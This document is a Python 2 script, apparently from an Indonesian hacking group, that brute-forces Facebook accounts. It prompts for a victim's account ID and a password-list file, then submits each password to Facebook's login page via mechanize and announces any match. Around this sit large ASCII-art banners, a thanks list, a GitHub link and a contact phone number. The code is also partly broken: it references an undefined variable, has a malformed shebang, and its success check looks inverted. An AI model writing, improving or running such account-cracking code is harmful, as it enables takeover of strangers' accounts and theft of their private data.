#!usr/bin/env python2.7
#
#
#  _    _            _               _____           
# | |  | |          | |             |  __ \          
# | |__| | __ _  ___| | _____ _ __  | |__) | __ ___  
# |  __  |/ _` |/ __| |/ / _ \ '__| |  ___/ '__/ _ \ 
# | |  | | (_| | (__|   <  __/ |    | |   | | | (_) |
# |_|  |_|\__,_|\___|_|\_\___|_|    |_|   |_|  \___/ 
#          Hacking Tools by B4J1N64N T3RH0RM4T

import sys
import random
import mechanize
import cookielib



print """\033[10;0m                                               
                                              _________________
                                             |  Spesial Thanks |
+=========================================+  |_________________|
|..........{+}Facebook Crack{+}...........|  |-Shofian         |
+-----------------------------------------+  |-Mr.Ruxhan       |
!------------#Author: Mr.Fat--------------!  |-Mr.057          |
!-----------------------------------------!  |-King Salman     |
!----ThanksTeam :B4J1N64N CYBER ARMY------!  |-Mr.X            |
!-----------------------------------------!  |-M1MK.N4N        |
+#########################################+  |-Mr.Kexz         |
|$$==========$$============$$===========$$|  |-Miss.W1T4       |
|+$$=======$$++$$========$$++$$========$$+|  |-Mr.Bio666x      |
|+++$$====$$B4J1N64N=T3RH0RM4T$$=====$$+++|  |-SkyBlu3         |
|++++$$==$$+++++++$$==$$++++++++$$==$$++++|  |-Zx-T500ROS      |
|++++++$$+++++++++++$$++++++++++++$$++++++|  |-MR.S4ND         |
+#########################################+  |-Mr.4B13         |
{                  _###_                  }  |-Mr.Dick         |
 #      ++++      #%%%%%#      ++++       #  |_________________|
  $----(Hati)-----$%%%%%$-----(Hati)-----$   |_________________|
  $     ++++     #%%%%%%%#     ++++     $ 
   $            *%%%%%%%%%*            $ 
   #           #%%%%%%%%%%%#           #
   #           #%%%%%%%%%%%#           #   
   #            *+++++++++*            #
   |*+++++++++++++++++++++++++++++++++*|
   |_____^_____^_____^_____^_____^_____|
   |                                   |
   |                                   |
   |                                   |
   |                                   |
 _ |  _            _               ____|       
| |  | |          | |             |  __ \          
| |__| | __ _  ___| | _____ _ __  | |__) | __ ___  
|  __  |/ _` |/ __| |/ / _ \ '__| |  ___/ '__/ _ \ 
| |  | | (_| | (__|   <  __/ |    | |   | | | (_) |
|_|  |_|\__,_|\___|_|\_\___|_|    |_|   |_|  \___/ 
   |     Hacking Tools by BCA Team     | 
   |                                   |
   |                                   |
   |                                   |
   |                                   |
   |___________________________________|
   |    |    |    |    |    |    |     |
   |*+++++++++++++++++++++++++++++++++*|
   |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
    |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|
       |%%%%%%%%%%%%%%%%%%%%%%%%%%%|
         |%%%%%%%%%%%%%%%%%%%%%%%|
           #===================#\n\n
  
             \033[90;1mMencoba Berkarya  \033[91;1m
       Created by:\033[97m B4J1N64N T3RH0RM4T 
      """
print "Gunakan sebaiknya"
print
print "Ctrl-C Buat Keluar Cuk"
print
print "Author By B4J1N64N T3RH0RM4T"
print
print "My Github :https://github.com/BajinganCyberArmy"
print
print "Contact :Fb((Fatur CloverID))Wa((0895360561400))"
print

email = str(raw_input("(#)(#)===D Masukan ID Korban : "))
print
passwordlist = str(raw_input("(#)(#)===D List Password.txt : "))

useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):

  try:
     sys.stdout.write("\r => trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)

      
         
     ##Facebook
     br.form['email'] =email
     br.form['pass'] =password
     br.submit()
     log = br.geturl()
     if log == login:
        print "\n\n\n  => Password found .. !!"
        print "\n  [*] Password => %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\n  => Exiting program .. "
        sys.exit(1)

def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))



def check():

    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print GHT
        print " [*] Account to crack : %s" % (email)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)

if __name__ == '__main__':
    check()